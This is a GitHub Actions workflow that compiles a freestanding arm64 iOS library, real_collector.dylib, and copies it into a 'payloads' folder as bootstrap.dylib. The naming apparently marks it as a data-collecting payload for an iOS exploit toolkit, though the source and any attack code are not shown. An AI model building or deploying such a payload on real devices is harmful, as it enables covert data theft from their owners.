name: Build real_collector.dylib

on:
  workflow_dispatch:
  push:
    paths:
      - "Coruna-main/data_collector/real_collector.dylib.c"
      - ".github/workflows/build-real-collector.yml"

jobs:
  build-ios-arm64:
    runs-on: macos-14
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Show Xcode / SDK
        run: |
          xcodebuild -version
          xcrun --sdk iphoneos --show-sdk-path
          clang --version

      - name: Build real_collector.dylib (arm64 freestanding)
        working-directory: Coruna-main/data_collector
        run: |
          set -e
          SDK="$(xcrun --sdk iphoneos --show-sdk-path)"
          echo "SDK=$SDK"
          # Apple 用 -dynamiclib；-nostdlib 避免拉 libc； freestanding 无外部依赖
          clang -arch arm64 -dynamiclib -Os \
            -isysroot "$SDK" \
            -miphoneos-version-min=13.0 \
            -fPIC \
            -ffreestanding \
            -fno-builtin \
            -fno-stack-protector \
            -fno-stack-check \
            -fomit-frame-pointer \
            -nostdlib \
            -o real_collector.dylib \
            -Wl,-install_name,@rpath/real_collector.dylib \
            -Wl,-dead_strip \
            -Wl,-exported_symbol,_process \
            real_collector.dylib.c
          file real_collector.dylib
          ls -la real_collector.dylib
          echo "=== nm -gU ==="
          nm -gU real_collector.dylib || true
          echo "=== nm -u (should be empty) ==="
          nm -u real_collector.dylib || true
          nm -gU real_collector.dylib | grep -E '[[:space:]]_process$'
          UNDEF="$(nm -u real_collector.dylib 2>/dev/null | tr -d '\r' | sed '/^$/d' || true)"
          if [ -n "$UNDEF" ]; then
            echo "ERROR: undefined symbols:"
            echo "$UNDEF"
            exit 1
          fi
          cp real_collector.dylib ../payloads/bootstrap.dylib
          ls -la ../payloads/bootstrap.dylib
          echo "build ok freestanding"

      - name: Upload artifacts
        uses: actions/upload-artifact@v4
        with:
          name: real_collector-ios-arm64
          path: |
            Coruna-main/data_collector/real_collector.dylib
            Coruna-main/payloads/bootstrap.dylib
          if-no-files-found: error
